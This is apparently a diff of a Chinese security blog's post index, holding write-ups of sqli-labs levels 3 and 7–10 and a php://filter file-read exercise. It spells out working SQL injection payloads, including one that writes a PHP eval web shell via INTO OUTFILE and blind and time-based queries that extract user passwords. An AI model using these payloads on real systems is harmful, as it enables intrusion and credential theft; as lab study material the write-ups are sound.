-<h1 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h1><p>这个没啥好说的，直接<code>order by</code>即可最后得出是3</p>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124204525136.png" alt="image-20220124204525136"></p>
-<h1 id="上传木马并连接"><a href="#上传木马并连接" class="headerlink" title="上传木马并连接"></a>上传木马并连接</h1><p><code>?id=1&#39;))union select 1,2,&quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\a.php&quot;--+</code>注意这里是<strong>双反斜杠</strong></p>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124204810866.png" alt="image-20220124204810866"></p>
-<p>然后查看靶机中相应的文件即可知道已经成功上传</p>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124204957483.png" alt="image-20220124204957483"></p>
-<p>然后用中国蚁剑进行连接</p>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205105057.png" alt="image-20220124205105057"></p>
-<p>注意，这里要定位到a.php，而不是仅仅到Less-7文件夹，连接成功后如下图</p>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205159761.png" alt="image-20220124205159761"></p>
-<h1 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h1><p><code>?id=1&#39;))union select 1,2,database() into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\b.txt&quot;--+</code> 这里换成<strong>b.txt</strong>了</p>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205333775.png" alt="image-20220124205333775"></p>
-<p>用蚁剑查看</p>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205413565.png" alt="image-20220124205413565"></p>
-<p>可知当前数据库是<strong>security</strong></p>
-<h1 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h1><p><code>?id=1&#39;))union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\c.txt&quot;--+</code>这里改成<strong>c.txt</strong>了，若仍是b.txt，则原先的b.txt不会改变，也不会新增内容。</p>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205728524.png" alt="image-20220124205728524"></p>
-<h1 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h1><p><code>?id=1&#39;))union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\d.txt&quot;--+</code></p>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205953312.png" alt="image-20220124205953312"></p>
-<h1 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h1><p><code>?id=1&#39;))union select 1,2,group_concat(username,1,password) from security.users into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\e.txt&quot;--+</code></p>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124210110521.png" alt="image-20220124210110521"></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>其实就是上传了一个一句话木马，然后用蚁剑进行查看相应数据，指令大多和第一关相似。</p>
-<p>特别之处就是用了<code>into outfile&quot;路径&quot;</code>这个语句。</p>
-<p>最后想说的是，蚁剑真的可怕！！！</p>
+    <title>php://filter 协议</title>
+    <url>/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[<h1 id="php-filter-协议"><a href="#php-filter-协议" class="headerlink" title="php://filter 协议"></a>php://filter 协议</h1><p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/20210711135416691.png" alt="asd"></p>
+<p><strong>1</strong>是格式<br><strong>2</strong>是可选参数，有read和write，字面意思就是读和写（如果不写可选参数2(read或write)，那么网页会自动匹配一个合适的read或write）<br><strong>3</strong>是过滤器。主要有四种：字符串过滤器，转换过滤器，压缩过滤器，加密过滤器。filter里可以用一或多个过滤器（中间用|隔开），这也为解题提供了多种方法，灵活运用过滤器是解题的关键。这里的过滤器是把文件flag.php里的代码转换（convert）为base64编码（encode）<br><strong>4</strong>是必选参数，后面写你要处理的文件名<br>常用过滤器</p>
+<span id="more"></span>
+
+<p>转base64编码：<code>convert.base64-encode</code></p>
+<p>转大写：<code>string.toupper</code></p>
+<p>php://filter还可以绕过，大概就是把不希望执行的语句先编码，这个编码类型可以破坏语句的正常执行<br>（比如base64编码只有64个字符，如果被编码的语句字符在64个字符里找不到对应的，就会忽略，略过它继续编码），然后再解码，这样就可以绕过这个语句了。</p>
+<p>例题：</p>
+<h1 id="ACTF2020-新生赛Include"><a href="#ACTF2020-新生赛Include" class="headerlink" title="ACTF2020 新生赛Include"></a>ACTF2020 新生赛Include</h1><p>打开题目后审视代码，发现啥也没有</p>
+<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170041509.png" alt="image-20211205170041509"></p>
+<p>但看到php文件，可以联想文件包含漏洞，然后我们可以用php://filter协议来查看源文件内容。</p>
+<p>构造：<code>php://filter/read=convert.base64-encode/resource=flag.php</code></p>
+<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170421228.png" alt="image-20211205170421228"></p>
+<p>这句话的意思是我们用base64编码的方式来读文件flag.php；这时页面会显示出源文件flag.php经过base64编码后的内容</p>
+<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170455351.png" alt="image-20211205170455351"></p>
+<p>然后经过base64解码就可以看到flag<br><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170507361.png" alt="image-20211205170507361"></p>
 ]]></content>
       <tags>
-        <tag>SQL</tag>
+        <tag>php协议</tag>
       </tags>
   </entry>
   <entry>
@@ -2130,68 +2106,51 @@
       </tags>
   </entry>
   <entry>
-    <title>sqlilabs第8-10关（盲注）</title>
-    <url>/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/</url>
-    <content><![CDATA[<h1 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h1><h2 id="判断闭合类型"><a href="#判断闭合类型" class="headerlink" title="判断闭合类型"></a>判断闭合类型</h2><p>?id=1’报错，?id=1’–+不报错，说明是单引号包裹。</p>
-<h2 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h2><p>这里要用到substr函数和ascii函数，顺便了解一下length函数</p>
-<p>substr函数是截取某一字段的第几个字母，ascii函数是将某一字符转变成ascii码的形式，而length函数则是判断字符串的长度。</p>
-<span id="more"></span>
-
-<p><code>?id=1&#39; and (select ascii(substr(database(),1,1)))=1--+</code></p>
-<p>这段语句表示，选取数据库名称的第一个字符，并判断其ascii码是否是1，如果是1则有回显，如果不是1就没有回显。<strong>第一个1表示从第一个字符截取，第二个1表示截取1位。</strong></p>
-<p><code>id=1&#39; and length(database())=8--+</code></p>
-<p>这段语句表示数据库名称的字符串长度为8，如果是8则有回显，如果不是8就没有回显（这条语句在本题没有使用）</p>
-<p>使用bp设置好变量，如图，开始爆破。</p>
-<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126103005854.png" alt="image-20220126103005854"></p>
-<p>爆破结果如下</p>
-<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126103224065.png" alt="image-20220126103224065"></p>
-<p>可得数据库</p>
-<p>115,101,99,117,114,105,116,121=&gt;security</p>
-<p>这里推荐去<a href="https://www.sojson.com/ascii.html">这里</a>按ctrl+f直接搜ascii对应字符。</p>
-<h2 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h2><p>套路还是一样</p>
-<p><code>?id=1&#39;  and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1)))=1--+</code></p>
-<p>这句话表示，选择数据库security中从第0行开始的第一行（也就是第0行）的字符串的第一个字符，并看该字符的ascii码是否为1。</p>
-<p>设置如下</p>
-<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126105448848.png" alt="image-20220126105448848"></p>
-<p>结果如下</p>
-<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126105504606.png" alt="image-20220126105504606"></p>
-<p>然后把上述的从第0行开始改成从第1行开始（也就是第二行的字符串，也就是第二个表名）</p>
-<p>修改和结果如下</p>
-<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126105854694.png" alt="image-20220126105854694"></p>
-<p>当改成4时，所有结果的长度均一致，说明不存在第5个表</p>
-<p>总结</p>
-<p>第一个数据表 101,109,97,105,108,115 =&gt;emails</p>
-<p>第二个数据表 114,101,102,101,114,101,114,115 =&gt;referers</p>
-<p>第三个数据表 117,97,103,101,110,116,115 =&gt;uagents</p>
-<p>第四个数据表 117,115,101,114,115 =&gt;users</p>
-<h2 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h2><p><code>?id=1&#39; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1),1,1)))=1--+</code></p>
-<p>这里就不解释了，差不多。</p>
-<p>最后爆出字段为</p>
-<p>第一个字段 105,100 =&gt;id</p>
-<p>第二个字段 117,115,101,114,110,97,109,101 =&gt;username</p>
-<p>第三个字段 112,97,115,115,119,111,114,100 =&gt;password</p>
-<h2 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h2><p>爆破第一个username</p>
-<p><code>?id=1&#39; and (select ascii(substr((select username from users limit 0,1),1,1)))=1--+</code></p>
-<p>爆破第一个password</p>
-<p><code>?id=1&#39; and (select ascii(substr((select password from users limit 0,1),1,1)))=1--+</code></p>
-<p>其余的只是改一下行数，然后再进行爆破即可。</p>
-<h1 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h1><p><strong>时间盲注：适用于无论语句正确与否，返回结果都一样。所以可以通过页面响应时间来判断注入的内容是否正确。</strong></p>
-<h2 id="判断闭合方式"><a href="#判断闭合方式" class="headerlink" title="判断闭合方式"></a>判断闭合方式</h2><p><code>?id=1&#39; and sleep(5)--+</code></p>
-<p>方法都一样，就是后面加一个<code>and sleep(5)</code>，来判断页面回显。</p>
-<p>经过判断，该题为单引号闭合</p>
-<h2 id="爆库-1"><a href="#爆库-1" class="headerlink" title="爆库"></a>爆库</h2><p><code>?id=1&#39; and if(ascii(substr(database(),1,1))=1,sleep(5),1)--+</code></p>
-<p>这里用到了if语句<code>if(条件,语句1,语句2)</code>这里是如果数据库名称的第一个字符的ascii码是1，则沉睡5秒，否则执行1（也就是不沉睡），配合bp使用，结果如下</p>
-<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126162028989.png" alt="image-20220126162028989"></p>
-<h2 id="爆表-1"><a href="#爆表-1" class="headerlink" title="爆表"></a>爆表</h2><p><code>?id=1&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=1,sleep(5),1)--+</code></p>
-<p>指令和结果都和第8题大同小异，不再解释</p>
-<h2 id="爆字段-1"><a href="#爆字段-1" class="headerlink" title="爆字段"></a>爆字段</h2><p><code>?id=1&#39; and if(ascii(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1),1,1))=1,sleep(5),1)--+</code></p>
-<p>指令和结果都和第8题大同小异，不再解释</p>
-<h2 id="查数据-1"><a href="#查数据-1" class="headerlink" title="查数据"></a>查数据</h2><p>爆第一个用户名</p>
-<p><code>?id=1&#39; and if(ascii(substr((select username from users limit 0,1),1,1))=1,sleep(5),1)--+</code></p>
-<p>爆第一个密码</p>
-<p><code>?id=1&#39; and if(ascii(substr((select password from users limit 0,1),1,1))=1,sleep(5),1)--+</code></p>
-<h1 id="第10关"><a href="#第10关" class="headerlink" title="第10关"></a>第10关</h1><p>除了闭合方式为双引号型，其余和第9关都一样</p>
-<p><code>?id=1&quot; and sleep(5)--+</code></p>
+    <title>sqlilabs第7关（上传木马）</title>
+    <url>/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/</url>
+    <content><![CDATA[<h1 id="配置关卡文件"><a href="#配置关卡文件" class="headerlink" title="配置关卡文件"></a>配置关卡文件</h1><p>首先，MySQL默认是不能通过sql上传文件的，具体请输入命令<code>show variables like &#39;%secure%&#39;</code> 查看</p>
+<p>若图中划红线的框为</p>
+<ul>
+<li><p>Null  不可上传</p>
+</li>
+<li><p>某一路径 只能在该路径及其子路径中上传</p>
+</li>
+<li><p>空   可以上传</p>
+<span id="more"></span></li>
+</ul>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124202815420.png" alt="image-20220124202815420"></p>
+<p>具体修改方法如下</p>
+<p>打开my.ini文件，并在[mysqld]栏中添加如下内容</p>
+<p><code>secure_file_priv=&quot;路径&quot;</code></p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124203529805.png" alt="image-20220124203529805"></p>
+<p>然后重启MySQL即可生效。</p>
+<p>以上步骤实际上是完善题目，因为此题本来就是用上传文件做，没法上传文件就是没法做。</p>
+<h1 id="判断闭合方式"><a href="#判断闭合方式" class="headerlink" title="判断闭合方式"></a>判断闭合方式</h1><p>首先输入<code>id=1&#39;</code>，报错；然后输入<code>id=1&#39;--+</code>，还是报错；接着输入<code>id=1&#39;)--+</code>，还是报错；最后尝试输入<code>id=1&#39;))--+</code>，这次终于对了，所以闭合方式就是单引号加双括号。</p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124204428285.png" alt="image-20220124204428285"></p>
+<h1 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h1><p>这个没啥好说的，直接<code>order by</code>即可最后得出是3</p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124204525136.png" alt="image-20220124204525136"></p>
+<h1 id="上传木马并连接"><a href="#上传木马并连接" class="headerlink" title="上传木马并连接"></a>上传木马并连接</h1><p><code>?id=1&#39;))union select 1,2,&quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\a.php&quot;--+</code>注意这里是<strong>双反斜杠</strong></p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124204810866.png" alt="image-20220124204810866"></p>
+<p>然后查看靶机中相应的文件即可知道已经成功上传</p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124204957483.png" alt="image-20220124204957483"></p>
+<p>然后用中国蚁剑进行连接</p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205105057.png" alt="image-20220124205105057"></p>
+<p>注意，这里要定位到a.php，而不是仅仅到Less-7文件夹，连接成功后如下图</p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205159761.png" alt="image-20220124205159761"></p>
+<h1 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h1><p><code>?id=1&#39;))union select 1,2,database() into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\b.txt&quot;--+</code> 这里换成<strong>b.txt</strong>了</p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205333775.png" alt="image-20220124205333775"></p>
+<p>用蚁剑查看</p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205413565.png" alt="image-20220124205413565"></p>
+<p>可知当前数据库是<strong>security</strong></p>
+<h1 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h1><p><code>?id=1&#39;))union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\c.txt&quot;--+</code>这里改成<strong>c.txt</strong>了，若仍是b.txt，则原先的b.txt不会改变，也不会新增内容。</p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205728524.png" alt="image-20220124205728524"></p>
+<h1 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h1><p><code>?id=1&#39;))union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\d.txt&quot;--+</code></p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205953312.png" alt="image-20220124205953312"></p>
+<h1 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h1><p><code>?id=1&#39;))union select 1,2,group_concat(username,1,password) from security.users into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\e.txt&quot;--+</code></p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124210110521.png" alt="image-20220124210110521"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>其实就是上传了一个一句话木马，然后用蚁剑进行查看相应数据，指令大多和第一关相似。</p>
+<p>特别之处就是用了<code>into outfile&quot;路径&quot;</code>这个语句。</p>
+<p>最后想说的是，蚁剑真的可怕！！！</p>
 ]]></content>
       <tags>
         <tag>SQL</tag>
@@ -2270,45 +2229,68 @@
       </tags>
   </entry>
   <entry>
-    <title>sqlilabs第三关</title>
-    <url>/2022/01/22/sqlilabs%E7%AC%AC%E4%B8%89%E5%85%B3/</url>
-    <content><![CDATA[<p>第三关和前两关没什么区别，主要是闭合方式的差异，这里顺便总结一下闭合方式</p>
-<ul>
-<li>整型</li>
-<li>单引号</li>
-<li>双引号</li>
-<li>单引号加括号</li>
-<li>双引号加括号</li>
-</ul>
+    <title>sqlilabs第8-10关（盲注）</title>
+    <url>/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/</url>
+    <content><![CDATA[<h1 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h1><h2 id="判断闭合类型"><a href="#判断闭合类型" class="headerlink" title="判断闭合类型"></a>判断闭合类型</h2><p>?id=1’报错，?id=1’–+不报错，说明是单引号包裹。</p>
+<h2 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h2><p>这里要用到substr函数和ascii函数，顺便了解一下length函数</p>
+<p>substr函数是截取某一字段的第几个字母，ascii函数是将某一字符转变成ascii码的形式，而length函数则是判断字符串的长度。</p>
 <span id="more"></span>
 
-<p>首先判断闭合方式</p>
-<p><code>?id=1&#39;</code></p>
-<p><code>?id=1&quot;</code></p>
-<p>**1.**如果都报错，就是整型</p>
-<p>**2.**如果单引号报错，双引号不报错，尝试</p>
-<p><code>?id=1&#39;--+</code></p>
-<p>如果不报错就是单引号闭合，报错就是单引号加括号闭合</p>
-<p>**3.**如果单引号不报错，双引号报错，尝试</p>
-<p><code>id=1&quot;--+</code></p>
-<p>无报错则双引号闭合，报错则双引号加括号闭合</p>
-<p><strong>任何闭合方式在没有遇到相对应的闭合时，都会把这个符号当做一个整体，注释符也没用！！</strong></p>
-<p>单引号</p>
-<p><img src="/2022/01/22/sqlilabs%E7%AC%AC%E4%B8%89%E5%85%B3/image-20220122200408676.png" alt="image-20220122200408676"></p>
-<p>双引号</p>
-<p><img src="/2022/01/22/sqlilabs%E7%AC%AC%E4%B8%89%E5%85%B3/image-20220122200430772.png" alt="image-20220122200430772"></p>
-<p>尝试?<code>id=1&#39;--+</code></p>
-<p><img src="/2022/01/22/sqlilabs%E7%AC%AC%E4%B8%89%E5%85%B3/image-20220122200511915.png" alt="image-20220122200511915"></p>
-<p>则可判断闭合方式是<strong>单引号加括号</strong></p>
-<p>其余与第一关就一样了</p>
-<p>判断字段数、回显点、暴库名就舍去了</p>
-<p>爆表名</p>
-<p><code>?id=-1&#39;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema =&#39;security&#39;--+</code></p>
-<p>爆字段名</p>
-<p><code>?id=-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema =&#39;security&#39; and table_name=&#39;users&#39;--+</code></p>
-<p>查数据</p>
-<p><code>?id=-1&#39;) union select 1,group_concat(username,1,password),3 from security.users--+</code></p>
-<p>完成</p>
+<p><code>?id=1&#39; and (select ascii(substr(database(),1,1)))=1--+</code></p>
+<p>这段语句表示，选取数据库名称的第一个字符，并判断其ascii码是否是1，如果是1则有回显，如果不是1就没有回显。<strong>第一个1表示从第一个字符截取，第二个1表示截取1位。</strong></p>
+<p><code>id=1&#39; and length(database())=8--+</code></p>
+<p>这段语句表示数据库名称的字符串长度为8，如果是8则有回显，如果不是8就没有回显（这条语句在本题没有使用）</p>
+<p>使用bp设置好变量，如图，开始爆破。</p>
+<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126103005854.png" alt="image-20220126103005854"></p>
+<p>爆破结果如下</p>
+<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126103224065.png" alt="image-20220126103224065"></p>
+<p>可得数据库</p>
+<p>115,101,99,117,114,105,116,121=&gt;security</p>
+<p>这里推荐去<a href="https://www.sojson.com/ascii.html">这里</a>按ctrl+f直接搜ascii对应字符。</p>
+<h2 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h2><p>套路还是一样</p>
+<p><code>?id=1&#39;  and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1)))=1--+</code></p>
+<p>这句话表示，选择数据库security中从第0行开始的第一行（也就是第0行）的字符串的第一个字符，并看该字符的ascii码是否为1。</p>
+<p>设置如下</p>
+<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126105448848.png" alt="image-20220126105448848"></p>
+<p>结果如下</p>
+<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126105504606.png" alt="image-20220126105504606"></p>
+<p>然后把上述的从第0行开始改成从第1行开始（也就是第二行的字符串，也就是第二个表名）</p>
+<p>修改和结果如下</p>
+<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126105854694.png" alt="image-20220126105854694"></p>
+<p>当改成4时，所有结果的长度均一致，说明不存在第5个表</p>
+<p>总结</p>
+<p>第一个数据表 101,109,97,105,108,115 =&gt;emails</p>
+<p>第二个数据表 114,101,102,101,114,101,114,115 =&gt;referers</p>
+<p>第三个数据表 117,97,103,101,110,116,115 =&gt;uagents</p>
+<p>第四个数据表 117,115,101,114,115 =&gt;users</p>
+<h2 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h2><p><code>?id=1&#39; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1),1,1)))=1--+</code></p>
+<p>这里就不解释了，差不多。</p>
+<p>最后爆出字段为</p>
+<p>第一个字段 105,100 =&gt;id</p>
+<p>第二个字段 117,115,101,114,110,97,109,101 =&gt;username</p>
+<p>第三个字段 112,97,115,115,119,111,114,100 =&gt;password</p>
+<h2 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h2><p>爆破第一个username</p>
+<p><code>?id=1&#39; and (select ascii(substr((select username from users limit 0,1),1,1)))=1--+</code></p>
+<p>爆破第一个password</p>
+<p><code>?id=1&#39; and (select ascii(substr((select password from users limit 0,1),1,1)))=1--+</code></p>
+<p>其余的只是改一下行数，然后再进行爆破即可。</p>
+<h1 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h1><p><strong>时间盲注：适用于无论语句正确与否，返回结果都一样。所以可以通过页面响应时间来判断注入的内容是否正确。</strong></p>
+<h2 id="判断闭合方式"><a href="#判断闭合方式" class="headerlink" title="判断闭合方式"></a>判断闭合方式</h2><p><code>?id=1&#39; and sleep(5)--+</code></p>
+<p>方法都一样，就是后面加一个<code>and sleep(5)</code>，来判断页面回显。</p>
+<p>经过判断，该题为单引号闭合</p>
+<h2 id="爆库-1"><a href="#爆库-1" class="headerlink" title="爆库"></a>爆库</h2><p><code>?id=1&#39; and if(ascii(substr(database(),1,1))=1,sleep(5),1)--+</code></p>
+<p>这里用到了if语句<code>if(条件,语句1,语句2)</code>这里是如果数据库名称的第一个字符的ascii码是1，则沉睡5秒，否则执行1（也就是不沉睡），配合bp使用，结果如下</p>
+<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126162028989.png" alt="image-20220126162028989"></p>
+<h2 id="爆表-1"><a href="#爆表-1" class="headerlink" title="爆表"></a>爆表</h2><p><code>?id=1&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=1,sleep(5),1)--+</code></p>
+<p>指令和结果都和第8题大同小异，不再解释</p>
+<h2 id="爆字段-1"><a href="#爆字段-1" class="headerlink" title="爆字段"></a>爆字段</h2><p><code>?id=1&#39; and if(ascii(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1),1,1))=1,sleep(5),1)--+</code></p>
+<p>指令和结果都和第8题大同小异，不再解释</p>
+<h2 id="查数据-1"><a href="#查数据-1" class="headerlink" title="查数据"></a>查数据</h2><p>爆第一个用户名</p>
+<p><code>?id=1&#39; and if(ascii(substr((select username from users limit 0,1),1,1))=1,sleep(5),1)--+</code></p>
+<p>爆第一个密码</p>
+<p><code>?id=1&#39; and if(ascii(substr((select password from users limit 0,1),1,1))=1,sleep(5),1)--+</code></p>
+<h1 id="第10关"><a href="#第10关" class="headerlink" title="第10关"></a>第10关</h1><p>除了闭合方式为双引号型，其余和第9关都一样</p>
+<p><code>?id=1&quot; and sleep(5)--+</code></p>
 ]]></content>
       <tags>
         <tag>SQL</tag>
@@ -2561,43 +2543,48 @@
       </tags>
   </entry>
   <entry>
-    <title>刷题记录-4（爆破）</title>
-    <url>/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/</url>
-    <content><![CDATA[<h1 id="WEB21"><a href="#WEB21" class="headerlink" title="WEB21"></a>WEB21</h1><p>这道题有点意思，不只是单纯的爆破，还进行了base64加密，首先下载给的字典。然后用字典进行爆破，爆破时要用custom iterator（自定义迭代器），然后通过base64解码得知格式为 <code>用户名:密码</code>攻击类型为Sniper</p>
-<p>设置如下</p>
+    <title>sqlilabs第三关</title>
+    <url>/2022/01/22/sqlilabs%E7%AC%AC%E4%B8%89%E5%85%B3/</url>
+    <content><![CDATA[<p>第三关和前两关没什么区别，主要是闭合方式的差异，这里顺便总结一下闭合方式</p>
+<ul>
+<li>整型</li>
+<li>单引号</li>
+<li>双引号</li>
+<li>单引号加括号</li>
+<li>双引号加括号</li>
+</ul>
 <span id="more"></span>
 
-<p><img src="/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/image-20220217175309858.png" alt="image-20220217175309858"></p>
-<p>这里的admin只是猜测，没想到真能搞出来</p>
-<p><img src="/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/image-20220217175341802.png" alt="image-20220217175341802"></p>
-<p><img src="/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/image-20220217175430654.png" alt="image-20220217175430654"></p>
-<p><img src="/2022/02/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-4/image-20220217180350198.png" alt="image-20220217180350198"></p>
-<p>最终得到flag</p>
-<h1 id="WEB22"><a href="#WEB22" class="headerlink" title="WEB22"></a>WEB22</h1><p>爆破子域名，这个还真不会，但是这个<a href="http://z.zcjun.com/?http=baidu.com">在线爆破子域名</a>可还行</p>
-<h1 id="WEB23"><a href="#WEB23" class="headerlink" title="WEB23"></a>WEB23</h1><p>呜呜呜，这个也不会，等着以后学了php再回来搞，码子先放这了</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;asdfghjklqwertyuiopzxcvbnm1234567890&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">36</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">36</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="variable">$token</span>=<span class="variable">$a</span>[<span class="variable">$i</span>].<span class="variable">$a</span>[<span class="variable">$j</span>];    </span><br><span class="line">        <span class="variable">$token</span> = md5(<span class="variable">$token</span>); </span><br><span class="line">        <span class="keyword">if</span>(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr(<span class="variable">$token</span>, <span 